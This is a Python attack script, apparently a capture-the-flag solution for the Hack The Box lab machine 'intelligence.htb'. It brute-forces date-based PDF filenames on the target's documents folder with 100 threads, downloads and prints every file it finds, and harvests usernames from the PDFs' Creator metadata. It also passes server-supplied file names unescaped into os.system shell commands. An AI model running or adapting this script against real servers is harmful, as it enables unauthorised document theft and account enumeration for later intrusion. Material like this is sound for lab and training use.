import requests
import threading
from pathlib import Path
from os import system, listdir
from pdfminer.pdfparser import PDFParser
from pdfminer.pdfdocument import PDFDocument

filename_end = "-upload.pdf"
url = "http://intelligence.htb/documents/"
directory_name = 'files'
_dir = f"./{directory_name}"
maxthreads = 100
sema = threading.Semaphore(value=maxthreads)
threads = []


def create_dictionary():
    print('### Generating possible filenames')
    dict_list = []
    for year in range(2019, 2022):
        for month in range(1, 13):
            alt_month = str(month)
            if month < 10:
                alt_month = f"0{month}"
            for day in range(1, 32):
                alt_day = str(day)
                if day < 10:
                    alt_day = f"0{day}"
                dict_list.append(f"{year}-{month}-{day}{filename_end}")
                if (month < 10 or day < 10):
                    dict_list.append(f"{year}-{alt_month}-{alt_day}{filename_end}")

    return dict_list


def download_files():
    Path(f"./{directory_name}").mkdir(parents=True, exist_ok=True)
    filename_list = create_dictionary()
    print('### Bruteforcing webpage for getting stored pdf files')
    files = []
    for filename in filename_list:
        t = threading.Thread(target=download_file, args=(url, filename))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    return files


def download_file(url, filename):
    sema.acquire()
    r = requests.get(f'{url}{filename}')
    if r.status_code == 200:
        with open(f'./{directory_name}/{filename}', 'wb') as f:
            f.write(r.content)
            f.close()

    sema.release()


def convert_files_to_text():
    files = listdir(f'{_dir}')
    for file in files:
        print(f'Converting file:{file} to txt')
        system(f"pdftotext {_dir}/{file} {_dir}/{file[:-3]}txt")


def print_files_content():
    for textfile in listdir(f'{_dir}'):
        if 'pdf' not in textfile:
            with open(f"{_dir}/{textfile}", 'rt', encoding='latin1') as f:
                print(f"Content of file {textfile}:")
                print(f.read())


def get_usernames_and_delete_pdfs():
    with open(f"{_dir}/possible_usernames", "a") as ul:
        for file in listdir(f'{_dir}'):
            if 'pdf' in file:
                filepath = f"{_dir}/{file}"
                fp = open(filepath, 'rb')
                parser = PDFParser(fp)
                doc = PDFDocument(parser)

                username = doc.info[0]['Creator'].decode('UTF-8')

                ul.write(f"{doc.info[0]['Creator'].decode('UTF-8')}\n")

                system(f"rm {filepath}")

    print("Found usernames")
    system(f"awk '!a[$0]++' {_dir}/possible_usernames > {_dir}/_possible_usernames")
    system(f"rm {_dir}/possible_usernames; mv {_dir}/_possible_usernames {_dir}/possible_usernames")
    system(f"cat {_dir}/possible_usernames")


def get_data():
    download_files()
    convert_files_to_text()
    print_files_content()
    get_usernames_and_delete_pdfs()


get_data()
